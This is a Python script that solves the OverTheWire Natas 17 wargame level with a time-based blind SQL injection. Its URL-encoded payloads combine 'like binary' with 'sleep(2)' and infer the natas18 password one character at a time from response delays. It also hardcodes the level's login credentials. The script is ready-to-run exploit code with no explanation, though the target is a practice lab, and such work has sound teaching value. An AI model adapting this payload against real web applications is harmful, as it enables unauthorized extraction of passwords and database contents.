#! /bin/python
import requests, string
url = "http://natas17.natas.labs.overthewire.org"
username = "natas17"
password = "XkEuChE0SbnKBvH1RU7ksIb9uuLmI7sd"
characters = ''.join([string.digits, string.ascii_letters])
passchar = []

for c in characters:
    query = '/index.php?username=natas18%22+and+password+like+binary+%27%25{0}%25%27+and+sleep%282%29+%23'.format(c)
    uri = url+query
    r = requests.get(uri, auth=(username, password))
    if(r.elapsed.seconds >= 1):
        passchar.append(c)
        print("> {0}".format(''.join(passchar)))
print("Character List: {0}".format(''.join(passchar)))


secret =''
for place in range(1,33):
    print ("Character# {}".format(str(place)))
    for char in passchar:
        temp = ''.join([secret,char])
        query = '/index.php?username=natas18%22+and+password+like+binary+%27{0}%25%25%27+and+sleep%282%29+%23'.format(temp)
        uri = url+query
        r = requests.get(uri, auth=(username, password))
        if(r.elapsed.seconds >= 1):
            secret += char
            print("Password : {}".format(secret))
